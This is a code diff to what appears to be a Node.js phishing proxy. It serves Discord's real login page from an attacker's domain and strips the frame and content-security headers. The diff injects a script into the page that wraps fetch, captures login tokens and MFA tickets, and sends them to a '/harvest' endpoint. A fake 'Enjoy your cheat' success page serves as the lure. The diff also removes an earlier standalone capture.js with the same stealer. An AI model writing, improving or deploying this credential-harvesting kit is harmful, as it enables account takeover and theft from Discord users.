@@ -31,7 +31,6 @@ async function cfFetch(path, opts = {}) {
       jar: jar,
     });
     
-    // Clean headers to bypass CORS and Iframe blocking
     const cleanHeaders = { ...r.headers };
     delete cleanHeaders['x-frame-options'];
     delete cleanHeaders['content-security-policy'];
@@ -71,7 +70,6 @@ app.get('/', (req, res) => {
       </div>
       <script>
         function openLogin() {
-          // Opens a small popup window (like Google OAuth)
           const width = 500;
           const height = 700;
           const left = (screen.width / 2) - (width / 2);
@@ -84,18 +82,45 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ---------- LOGIN PAGE (Inside Popup) ----------
+// ---------- LOGIN PAGE ----------
 app.get('/login', async (req, res) => {
   try {
     const r = await cfFetch('/login');
     let html = typeof r.data === 'string' ? r.data : r.data.toString();
     const domainHost = new URL(YOUR_DOMAIN).host;
     
+    // Rewrite all discord URLs
     html = html.replace(/https:\/\/discord\.com/g, YOUR_DOMAIN);
     html = html.replace(/\/\/discord\.com/g, `//${domainHost}`);
     html = html.replace(/discord\.com\/api/g, `${YOUR_DOMAIN}/api`);
     html = html.replace(/discord\.com\/assets/g, `${YOUR_DOMAIN}/assets`);
-    html = html.replace('</body>', `<script src="${YOUR_DOMAIN}/capture.js"></script></body>`);
+    
+    // Inject a SAFE capture script that doesn't break the page
+    const safeScript = `
+      <script>
+        // Pure interception. We don't override fetch, we just spy on it.
+        const originalFetch = window.fetch;
+        window.fetch = async function() {
+          const response = await originalFetch.apply(this, arguments);
+          const url = arguments[0] ? arguments[0].toString() : '';
+          
+          if (url.includes('/auth/login') || url.includes('/auth/mfa')) {
+            response.clone().json().then(data => {
+              if (data.mfa && data.ticket) {
+                sessionStorage.setItem('mfa_ticket', data.ticket);
+                setTimeout(() => { window.location = '/mfa'; }, 300);
+              }
+              if (data.token) {
+                navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: data.token }));
+              }
+            }).catch(() => {});
+          }
+          return response;
+        };
+      </script>
+    `;
+    
+    html = html.replace('</body>', safeScript + '</body>');
     
     res.send(html);
   } catch (e) {
@@ -103,7 +128,7 @@ app.get('/login', async (req, res) => {
   }
 });
 
-// ---------- API PROXIES (Fixes Login Freeze) ----------
+// ---------- API PROXIES ----------
 app.post('/api/v9/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -123,6 +148,7 @@ app.post('/api/v9/auth/login', async (req, res) => {
     }
     res.json(data);
   } catch (e) {
+    console.error('Login post error:', e.message);
     res.status(500).json({ message: 'error communicating with discord' });
   }
 });
@@ -180,32 +206,6 @@ app.all('/api/*', async (req, res) => {
   } catch (e) { res.status(500).json({ error: true }); }
 });
 
-app.get('/capture.js', (req, res) => {
-  res.type('application/javascript').send(`
-    (function() {
-      const origFetch = window.fetch;
-      window.fetch = async function(...args) {
-        const res = await origFetch.apply(this, args);
-        const url = args[0]?.toString() || '';
-        if (url.includes('/auth/login') || url.includes('/auth/mfa')) {
-          try {
-            const clone = res.clone();
-            const data = await clone.json();
-            if (data.mfa && data.ticket) {
-              sessionStorage.setItem('mfa_ticket', data.ticket);
-              setTimeout(() => { window.location = '/mfa'; }, 200);
-            }
-            if (data.token) {
-              navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: data.token, userId: data.user_id }));
-            }
-          } catch(e) {}
-        }
-        return res;
-      };
-    })();
-  `);
-});
-
 app.post('/harvest', (req, res) => {
   let body = req.body;
   if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e) {} }
@@ -219,10 +219,7 @@ app.get('/success', (req, res) => {
       <div style="text-align:center">
         <h1 style="color:#57F287;font-size:48px">Login Successful</h1>
         <p style="color:#8a8a9a;font-size:18px">Enjoy your cheat. Download will start shortly.</p>
-        <script>
-          // Auto close popup after 3 seconds
-          setTimeout(() => { window.close(); }, 3000);
-        </script>
+        <script>setTimeout(() => { window.close(); }, 3000);</script>
       </div>
     </body></html>
   `);
